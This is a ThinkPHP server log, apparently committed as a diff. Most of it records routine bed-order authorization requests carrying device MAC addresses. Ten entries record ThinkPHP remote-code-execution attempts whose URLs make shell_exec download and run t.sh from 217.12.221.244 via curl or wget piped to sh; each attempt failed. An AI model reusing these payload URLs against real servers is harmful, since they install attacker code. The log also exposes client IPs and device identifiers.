@@ -1,0 +1,318 @@
+---------------------------------------------------------------
+[ 2020-02-28T00:35:16+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T00:35:17+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T01:21:20+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T01:21:21+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T02:27:16+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T02:27:16+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T07:29:36+08:00 ] 223.104.254.53 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F43526181FF0"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T08:01:00+08:00 ] 39.144.17.183 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C13D829CA83E"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T08:02:36+08:00 ] 221.178.125.32 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C85FD234721F"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T08:02:41+08:00 ] 221.178.125.32 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C85FD234721F"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T08:03:00+08:00 ] 221.178.125.32 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C85FD234721F"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T08:03:25+08:00 ] 221.178.125.32 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C85FD234721F"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T09:55:09+08:00 ] 39.144.18.214 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DAC2EA93FCAB"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T09:55:13+08:00 ] 39.144.18.214 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DAC2EA93FCAB"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T10:15:26+08:00 ] 223.104.255.227 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F34634F389D4"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T10:15:29+08:00 ] 223.104.255.227 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F34634F389D4"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T10:15:34+08:00 ] 223.104.255.227 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F34634F389D4"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T10:15:52+08:00 ] 223.104.255.227 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F34634F389D4"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T10:15:57+08:00 ] 223.104.255.227 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F34634F389D4"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T10:16:34+08:00 ] 223.104.254.11 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F34634F389D4"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T10:16:42+08:00 ] 223.104.254.11 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F34634F389D4"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T10:16:45+08:00 ] 223.104.254.11 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F34634F389D4"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T10:20:46+08:00 ] 39.144.18.25 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D969E464107E"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T10:49:22+08:00 ] 218.204.253.120 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F34634F389D4"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T11:02:48+08:00 ] 218.204.253.161 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D3D67CFC2865"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T11:14:36+08:00 ] 218.204.252.117 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F7F2A08761C6"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T13:47:02+08:00 ] 218.204.252.255 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D5E2AE9D2DEA"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T13:54:15+08:00 ] 117.132.195.9 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E19B5C873082"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T13:54:20+08:00 ] 117.132.195.9 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E19B5C873082"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T13:54:31+08:00 ] 117.132.195.9 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E19B5C873082"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T14:06:55+08:00 ] 218.204.253.49 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"FCB92889C178"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T14:07:02+08:00 ] 218.204.253.49 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"FCB92889C178"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T14:22:46+08:00 ] 117.132.191.37 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C5E46B095C73"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T14:53:24+08:00 ] 223.104.254.23 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F61896AF99E8"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T16:06:32+08:00 ] 218.204.252.213 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DDEF23BB9FAF"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T17:11:12+08:00 ] 39.144.18.182 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F1DC5B21F1DB"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T17:20:34+08:00 ] 117.132.197.109 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E2DEFFE3062B"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T17:37:15+08:00 ] 117.132.195.9 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E19B5C873082"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T17:37:19+08:00 ] 117.132.195.9 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E19B5C873082"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T18:23:56+08:00 ] 221.178.124.46 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"FD27AD19F3CB"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T19:15:56+08:00 ] 218.204.252.149 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DA577891A4BF"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T19:16:04+08:00 ] 218.204.252.149 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DA577891A4BF"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T19:16:08+08:00 ] 218.204.252.149 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DA577891A4BF"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T19:16:11+08:00 ] 218.204.252.149 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DA577891A4BF"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T19:16:14+08:00 ] 218.204.252.149 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DA577891A4BF"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T19:16:28+08:00 ] 218.204.252.149 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DA577891A4BF"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T19:16:32+08:00 ] 218.204.252.149 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DA577891A4BF"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T19:16:58+08:00 ] 218.204.252.149 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DA577891A4BF"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T19:46:51+08:00 ] 117.132.197.135 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E54D2F2F6E46"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T21:13:14+08:00 ] 39.144.18.55 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E4314127DD44"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T21:13:19+08:00 ] 39.144.18.55 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E4314127DD44"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T21:13:23+08:00 ] 39.144.18.55 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E4314127DD44"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T22:02:13+08:00 ] 218.204.252.117 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F7F2A08761C6"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-02-28T22:34:12+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T22:34:13+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T22:43:28+08:00 ] 159.89.162.22 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T22:43:40+08:00 ] 39.107.240.139 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T23:28:47+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-02-28T23:28:48+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
